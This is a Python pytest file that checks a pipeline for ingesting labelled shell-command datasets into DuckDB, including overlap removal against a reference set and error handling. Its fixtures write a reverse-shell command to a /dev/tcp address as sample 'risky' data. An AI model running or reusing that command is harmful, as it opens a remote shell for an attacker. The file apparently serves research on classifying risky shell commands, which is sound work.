"""Real publisher examples run through the CLI and both observation tables."""
import csv
import json
import subprocess
import sys
from pathlib import Path

import duckdb
import pyarrow as pa
import pyarrow.parquet as pq
import pytest
from _ingest_quasarnix import FILES

SCRIPTS = Path(__file__).resolve().parents[1] / 'scripts'


def ingest(root, db, *args):
    driver = root / 'driver.py'
    driver.write_text(f'import sys\nfrom pathlib import Path\nsys.path.insert(0,{str(SCRIPTS)!r})\n'
                      'from _ingest import run\nfrom _ingest_tabular import records\n'
                      'run(Path(__file__).parent, records)\n')
    return subprocess.run([sys.executable, str(driver), '--db', str(db), *args],
                          capture_output=True, text=True, check=False)


def reference(parent):
    root = parent / 'quasarnix'
    root.mkdir()
    for name in FILES:
        (root / name).write_text(json.dumps(['sh -i >& /dev/tcp/10.164.246.227/53 0>&1']))
    # The published background needs repair for this invalid JSON escape.
    (root / 'nl2bash.json').write_text('["find . -name \\!", "df -h"]')
    return root


def source(root):
    """Write excerpts in the publishers' actual storage formats."""
    root.mkdir()
    attack = 'sh -i >& /dev/tcp/10.164.246.227/53 0>&1'
    if root.name == 'nl2sh-alfa':
        for filename, fields, rows in [
            ('train.csv', ['nl', 'bash'], [['show space', 'df -h'], ['reverse shell', attack],
                                         ['show space', 'df -h '], ['files', 'find . -name \\!']]),
            ('test.csv', ['nl', 'bash', 'bash2'], [['list files', 'ls', 'ls -l']])]:
            with (root / filename).open('w', newline='') as stream:
                writer = csv.writer(stream); writer.writerow(fields); writer.writerows(rows)
        return [('ls', 'benign'), ('ls -l', 'benign'), ('df -h ', 'benign')]
    if root.name == 'shellrisk-bench':
        (root / 'data').mkdir()
        for split, rows in [('train', [('df -h', 'not_risky'), (attack, 'risky'),
                                      ('df -h ', 'risky'), ('find . -name \\!', 'not_risky')]),
                            ('test', [('cobc -v || true', 'not_risky')])]:
            pq.write_table(pa.Table.from_pylist([{'command': text, 'label': label} for text, label in rows]),
                           root / f'data/{split}-00000-of-00001.parquet')
        return [('cobc -v || true', 'benign'), ('df -h ', 'unknown')]
    if root.name == 'mecha':
        (root / 'linuxcommands.json').write_text(json.dumps([
            {'input': 'Compress data', 'output': 'bzip2 data.txt'},
            {'input': 'Show and count', 'output': 'cat data.txt | wc -l'}]))
        return [('bzip2 data.txt', 'benign'), ('cat data.txt | wc -l', 'benign')]
    (root / 'cli_commands_explained.json').write_text(json.dumps([
        {'code': 'sudo !!'}, {'code': ''}, {'code': 'python -m SimpleHTTPServer'}]))
    return [('sudo !!', 'unknown'), ('python -m SimpleHTTPServer', 'unknown')]


@pytest.mark.parametrize('dataset', ['nl2sh-alfa', 'shellrisk-bench', 'mecha', 'cli-commands-explained'])
def test_tabular_cli(dataset, tmp_path):
    root = tmp_path / dataset
    expected = source(root)
    reference(tmp_path)
    db = tmp_path / 'commands.duckdb'
    # A limited run leaves INGESTED false and the complete retry replaces it.
    limited = ingest(root, db, '--limit', '1')
    assert limited.returncode == 0, limited.stderr
    with duckdb.connect(str(db)) as con:
        assert con.execute('SELECT ingested FROM INGESTED').fetchone() == (False,)
    result = ingest(root, db)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(db)) as con:
        rows = con.execute('SELECT shell_input,dataset_label FROM SHELL_INPUTS ORDER BY record_id').fetchall()
        assert rows == expected
        for table in ['SHELL_INPUTS', 'PROCESS_LAUNCHES']:
            assert con.execute(f'SELECT count(*) FROM {table} WHERE group_id IS NOT NULL OR os != \'linux\'').fetchone() == (0,)
        assert con.execute('SELECT count(*) FROM PROCESS_LAUNCHES p JOIN SHELL_INPUTS s '
                           "ON p.record_id LIKE s.record_id || ':%' "
                           'WHERE p.session_id != s.session_id OR p.dataset_label != s.dataset_label').fetchone() == (0,)
        assert con.execute('SELECT count(DISTINCT session_id) FROM SHELL_INPUTS').fetchone() == (len(expected),)
        before = con.execute('SELECT * FROM SHELL_INPUTS ORDER BY record_id').fetchall()
        con.execute('UPDATE INGESTED SET ingested=false')
    again = ingest(root, db)
    assert again.returncode == 0, again.stderr
    with duckdb.connect(str(db)) as con:
        assert con.execute('SELECT * FROM SHELL_INPUTS ORDER BY record_id').fetchall() == before
        assert con.execute('SELECT ingested FROM INGESTED').fetchone() == (True,)
    skipped = ingest(root, db)
    assert json.loads(skipped.stdout)['skipped']
    if dataset in ('nl2sh-alfa', 'shellrisk-bench'):
        report = next(json.loads(line) for line in result.stderr.splitlines() if line.startswith('{'))
        assert report['quasarnix_overlap_removed'] == 3


@pytest.mark.parametrize('dataset', ['nl2sh-alfa', 'shellrisk-bench'])
@pytest.mark.parametrize('damage', ['missing', 'invalid', 'wrong_type'])
def test_reference_required_even_when_limited(dataset, damage, tmp_path):
    root = tmp_path / dataset
    source(root)
    refs = reference(tmp_path)
    path = refs / FILES[0]
    if damage == 'missing':
        path.unlink()
    else:
        path.write_text('not json' if damage == 'invalid' else '[123]')
    db = tmp_path / 'commands.duckdb'
    result = ingest(root, db, '--max-records', '1', '--sample-files', '1')
    assert result.returncode != 0
    assert str(path) in result.stderr
    with duckdb.connect(str(db)) as con:
        assert con.execute('SELECT ingested FROM INGESTED').fetchone() == (False,)
        assert con.execute('SELECT count(*) FROM SHELL_INPUTS').fetchone() == (0,)


def test_unknown_risk_fails(tmp_path):
    root = tmp_path / 'shellrisk-bench'
    source(root)
    reference(tmp_path)
    pq.write_table(pa.Table.from_pylist([{'command': 'ls', 'label': 'unexpected'}]),
                   root / 'data/test-00000-of-00001.parquet')
    result = ingest(root, tmp_path / 'commands.duckdb')
    assert result.returncode != 0
    assert 'unexpected risk label' in result.stderr


def test_real_markdown_and_multiline_inputs(tmp_path):
    root = tmp_path / 'cli-commands-explained'
    root.mkdir()
    multiline = "printf '%s\\n' one \\\n two | sort"
    rows = [
        {'code': '```toml\n[tool.poetry.dependencies]\nmy-package = {path = "../my/path", develop = true}\n```'},
        {'code': '```toml\n[tool.poetry.scripts]\nmy-script = "my_module:main"\n```\npoetry run my-script'},
        {'code': '```cat <(sort <(cut -d "," -f 1 <(grep \'\\w*\\d\' file.txt)))```'},
        {'code': multiline},
    ]
    (root / 'cli_commands_explained.json').write_text(json.dumps(rows))
    db = tmp_path / 'commands.duckdb'
    result = ingest(root, db)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(db)) as con:
        assert con.execute('SELECT shell_input FROM SHELL_INPUTS ORDER BY record_id').fetchall() == [
            ('poetry run my-script',), (rows[2]['code'][3:-3],), (multiline,)]
        assert con.execute("SELECT pgm FROM PROCESS_LAUNCHES WHERE record_id LIKE '%:1:%'").fetchall() == [('poetry',)]


@pytest.mark.parametrize('contents, message', [
    ('{}', 'expected an array'), ('[{"output": null}]', 'expected command text'),
    ('[{"output": "```toml\\nmissing closing fence"}]', 'unclosed configuration'),
])
def test_invalid_source_fails(contents, message, tmp_path):
    root = tmp_path / 'mecha'
    root.mkdir()
    (root / 'linuxcommands.json').write_text(contents)
    result = ingest(root, tmp_path / 'commands.duckdb')
    assert result.returncode != 0
    assert message in result.stderr


def test_missing_release_fails(tmp_path):
    root = tmp_path / 'mecha'
    root.mkdir()
    result = ingest(root, tmp_path / 'commands.duckdb')
    assert result.returncode != 0
    assert 'Missing release file' in result.stderr


def test_max_records_uses_complete_reference(tmp_path):
    root = tmp_path / 'nl2sh-alfa'
    source(root)
    refs = reference(tmp_path)
    # An overlap late in the reference must still exclude an early source row.
    (refs / 'nl2bash.json').write_text(json.dumps(['unrelated'] * 5 + ['df -h']))
    db = tmp_path / 'commands.duckdb'
    result = ingest(root, db, '--max-records', '1')
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(db)) as con:
        assert con.execute('SELECT shell_input FROM SHELL_INPUTS ORDER BY record_id').fetchall() == [('ls',), ('ls -l',)]
        assert con.execute('SELECT ingested FROM INGESTED').fetchone() == (False,)
